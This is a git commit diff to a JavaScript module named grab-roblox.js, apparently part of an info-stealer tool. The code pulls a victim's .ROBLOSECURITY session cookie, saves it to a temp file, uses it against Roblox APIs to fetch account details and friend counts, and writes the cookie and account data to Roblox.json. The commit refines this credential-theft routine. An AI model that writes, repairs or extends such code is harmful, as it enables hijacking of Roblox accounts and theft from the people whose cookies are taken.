cddf5f0bb2156c06b71cabb97ae745340228475a
Yuuto <55290516+JustYuuto@users.noreply.github.com>
2023-08-18 19:21:14 +0200

    roblox

--- functions/grab-roblox.js
+++ functions/grab-roblox.js
@@ -1,6 +1,5 @@
 const { join } = require('path');
 const fs = require('fs');
-const { searchForFile } = require('../util/dir');
 const axios = require('axios');
 const { writeFileSync } = require('fs');
 const { getCookies } = require('../util/cookies');
@@ -14,11 +13,11 @@ module.exports = async () => {
   fs.writeFileSync(join(getTempFolder(), 'Roblox Cookie.txt'), cookie);
 
   const jsonFile = join(getTempFolder(), 'Roblox.json');
-  const config = { headers: { Cookie: '.ROBLOSECURITY=' + file.replaceAll('"', '') } };
+  const config = { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } };
   const account = await axios.get('https://www.roblox.com/mobileapi/userinfo', config);
   const friendsCount = await axios.get('https://friends.roblox.com/v1/my/friends/count', config) || undefined;
   account.data.source = source;
   account.data.cookie = cookie;
-  account.data.friendsCount = friendsCount.data.count;
+  account.data.friendsCount = friendsCount?.data?.count;
   writeFileSync(jsonFile, JSON.stringify(account.data));
 };
